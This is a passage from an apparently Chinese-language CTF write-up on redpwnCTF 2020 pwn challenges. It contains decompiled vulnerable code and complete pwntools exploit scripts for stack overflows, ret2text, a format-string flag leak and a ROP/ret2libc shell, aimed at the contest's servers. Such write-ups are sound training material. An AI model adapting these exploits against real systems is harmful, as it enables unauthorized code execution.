class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : coffer-overflow-0.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./coffer-overflow-0&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31199</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./coffer-overflow-0&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0X1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;with?\n&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="coffer-overflow-1"><a href="#coffer-overflow-1" class="headerlink" title="coffer-overflow-1"></a>coffer-overflow-1</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>题目给了程序源代码，但是我们还是按照正常题目做法分析二进制文件。</p><p>漏洞就在 main 中，gets 函数存在栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to coffer overflow, where our coffers are overfilling with bytes ;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to fill your coffer with?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0LL</span>);                               <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">3405691582LL</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数中在存在着 <code>system(&quot;/bin/sh&quot;)</code> 的后门函数。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序用 gets 函数存在栈溢出漏洞，而进入后门函数需要判断 v5 的值是否为 <code>0xCAFEBABE</code> 。这里就有两种做法，一种利用栈溢出修改栈上变量 v5 的值，从而让程序正常进入 后门函数 ；第二种就是栈溢出修改 rip 的返回地址到 <code>system(&quot;/bin/sh&quot;)</code>  。两种做法都可行，我采用第一种。</p><p>首先就是确定 v5 变量在栈上的位置。可以从 IDA 变量后面的注释去分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p>v4 距离 rbp 0x20 ；v5 距离 rbp 0x8；那么可以得出 v4 距离 v5 0x16(0x20-0x8)。</p><p>确定填充长度之后就是填充内容了，if 条件检查的是 v5 的布尔值，那么就赋值一个 1 即可条件成立，进入后门函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0X1</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : coffer-overflow-1.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./coffer-overflow-1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31255</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./coffer-overflow-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;with?\n&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="coffer-overflow-2"><a href="#coffer-overflow-2" class="headerlink" title="coffer-overflow-2"></a>coffer-overflow-2</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-2"><a href="#保护情况-2" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-2"><a href="#漏洞函数-2" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>题目给了程序源代码，但是我们还是按照正常题目做法分析二进制文件。</p><p>漏洞就在 main 中，gets 函数存在栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to coffer overflow, where our coffers are overfilling with bytes ;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to fill your coffer with?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中存在有后门函数，但不像前两题放在 main 函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>程序用 gets 函数存在栈溢出漏洞，也有后门函数，但不像前两题放在 main 函数中。做法就是前两题提到的第二种做法：利用栈溢出修改 rip 的返回地址到后门函数 <code>binFunction()</code> 。</p><p>首先就是确定填充长度，可以从 IDA 变量后面的注释去分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br></pre></td></tr></table></figure><p>填充 0x10 到 rbp ，再填充 0x8 就是到达了 rip 。最终得出我们需要填充 0x18 。</p><p>填充长度确认了，然后就是 rip 的填充内容，程序没有打开 pie 保护，直接从 ida 里面找到 <code>binFunction()</code> 地址：0x04006E6 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(binFunction)</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : coffer-overflow-2.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./coffer-overflow-2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31908</span>)</span><br><span class="line">elf = process(<span class="string">&quot;./coffer-overflow-2&quot;</span>)</span><br><span class="line"></span><br><span class="line">binFunction = <span class="number">0x04006E6</span></span><br><span class="line">log.info(<span class="string">&quot;binFunction:&quot;</span>+<span class="built_in">hex</span>(binFunction))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(binFunction)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;with?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret-flag"><a href="#secret-flag" class="headerlink" title="secret-flag"></a>secret-flag</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-3"><a href="#保护情况-3" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-3"><a href="#漏洞函数-3" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>main 函数中的 19 行格式化字符串漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  fd = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a secret flag, which you&#x27;ll never get!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name, young adventurer?&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x14</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello there: &quot;</span>, <span class="number">0x14</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);                                   <span class="comment">// 格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>main 函数开始先申请一个块堆，用 buf 去存储堆指针。然后从 flag.txt 读取 flag 到 buf 指向的堆中。</p><p>19 行存在一个格式化字符串漏洞，这个格式化字符串漏洞， 可以用来读取数据。到这里我们肯定会联想到读取程序中被读入的 flag 。</p><p>正常来说，通常都是通过偏移读取栈上的数据，常用的是用 %p 、%x ……但是这道题目将 flag 存放在堆上，堆指针存放在了栈上。</p><p>这里就需要知道一个技巧了，%p、%x 读取的时候是找到栈上的某一个地址后，将该地址存储的数据当作值输出。而使用 %s 读取时是找到栈上的某一个地址后，将该地址存储的数据当做指针，去找这个指针指向的值。</p><p>结合这条题理解一下，将断点打在 0x9f0 ，打开 PIE 保护程序打断点：<code>gdb.attach(p,&quot;b *$rebase(0x9f0)&quot;)</code>，运行到断点处观察栈结构：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3NreWVkYWk5MTAvUGljYmVkL2ltZy8yMDIwMDYyMzE3MzQxNC5wbmc?x-oss-process=image/format,png"></p><p>内存地址 0x7fffffffdd58 存储值为：0x555555756010；0x555555756010 是堆指针，堆中存储是本地flag：bbbbbbbbccccccccdddddddd\n。</p><p>下面是分别用 %p 和 %s 输出的结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> %p输出结果</span></span><br><span class="line">0x555555756010</span><br><span class="line"><span class="meta">#</span><span class="bash"> %s输出结果</span></span><br><span class="line">bbbbbbbbccccccccdddddddd</span><br></pre></td></tr></table></figure><p>还有一点就是<strong>用 %s 输出数据会一直输出直到遇到 \x00（结束符）为止</strong>。</p><p>确定了泄露 flag 方法了，然后就是需要确定偏移地址了。偏移地址可以用算，也可以输入多个 %p 爆出来，这次我试一下没用过的算出来。</p><p>首先 64 位程序前 6 个参数是寄存器传参，然后 rsp 到格式化字符串距离是 3 ，所以格式化字符串偏移为 5+3 ；堆指针偏移为 5+2 。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3NreWVkYWk5MTAvUGljYmVkL2ltZy8yMDIwMDYyMzE3NDYyMS5wbmc?x-oss-process=image/format,png"></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : secret-flag.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./secret-flag&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;2020.redpwnc.tf&quot;,31826)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./secret-flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">&quot;%7$s&quot;</span><span class="comment">#+ &quot;%8$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;adventurer?\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x9f0)&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="the-library"><a href="#the-library" class="headerlink" title="the-library"></a>the-library</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-4"><a href="#保护情况-4" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-4"><a href="#漏洞函数-4" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>这里有两个漏洞，都是在 main 中。一个是栈溢出、一个是格式化字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the library... What&#x27;s your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);                      <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello there: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);                                   <span class="comment">// 格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序没有给后门函数。</p><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>这个程序没有开 canary 直接利用栈溢出做一个 ROP 就行了。填充长度是：0x10+0x8 。先用 puts@plt 输出 puts@got ，然后 ret2text 回到 main 中，再次利用栈溢出修改 rip 执行 <code>system(&#39;/bin/sh&#39;)</code> 。payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br></pre></td></tr></table></figure><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : the-library.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./the-library&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31350</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./the-library&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0400637</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">log.success(<span class="string">&quot;starting payload1&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - <span class="number">0x0809c0</span><span class="comment">#libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + <span class="number">0x04f440</span><span class="comment">#libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + <span class="number">0x1b3e9a</span><span class="comment">#libc.search(&#x27;/bin/sh\x00&#x27;).next()</span></span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span 